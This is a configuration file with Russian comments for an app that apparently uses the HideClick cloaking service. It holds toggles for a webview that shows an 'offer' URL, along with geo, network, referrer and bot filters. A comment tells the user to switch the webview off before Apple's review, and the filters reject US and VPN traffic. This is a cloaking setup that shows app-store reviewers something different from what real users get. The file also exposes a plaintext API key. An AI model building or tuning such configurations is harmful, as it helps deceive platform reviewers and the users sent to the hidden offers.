# Главный тумблер
webview_power_state = "off"       # "on" / "off" — перед ревью Apple ставь "off"

# Тумблер для фильтра
use_hideclick = False       # "True" / "False" — включить или выключить фильтр

# Оффер
offer_url = "https://www.google.com/"

# HideClick API
hideclick_api_key = "v1a80428f72ca04f3f9348b2319ad04338"
hideclick_stage = "sdk"          # "app" для мобильных приложений
hideclick_version = 20250620
hideclick_group = "com.cyber.tower"

# Гео фильтр
filter_geo_mode = "reject"       # "allow" / "reject" / "" (выкл)
filter_geo_list = "US"           # коды стран через запятую: "US", "US,GB,DE"

# Сеть фильтр
filter_net_mode = "reject"       # "allow" / "reject" / "" (выкл)
filter_net_list = "vpn"          # vpn, mobile, residential, corporate — через запятую

# UTM фильтр
filter_utm_mode = ""             # "allow" / "reject" / "" (выкл)
filter_utm_list = ""             # regexp

# Реферер фильтр
filter_ref_mode = ""             # "allow" / "reject" / "" (выкл)
filter_ref_list = ""             # regexp
filter_noref = ""                # "allow" / "reject" / "" (выкл) — запросы без реферера

# Браузер фильтр
filter_bro_mode = ""             # "allow" / "reject" / "" (выкл)
filter_bro_list = ""             # названия браузеров

# DDOS защита
block_ddos = False               # True — блокировать IP при DDOS
delay_start = 0                  # блокировать первые N уникальных IP
delay_permanent = False          # навсегда блокировать IP из delay_start
delay_nonbot = False             # не считать ботов в delay_start

# Сессии
use_sessions = True              # не перепроверять юзера после первой проверки

# Кэш
disable_cache = False
skip_cache = False

# ML (PRO)
ml_set = ""                      # кастомные AI модели HideClick PRO

# Debug
debug_mode = "off"               # "on" / "off"
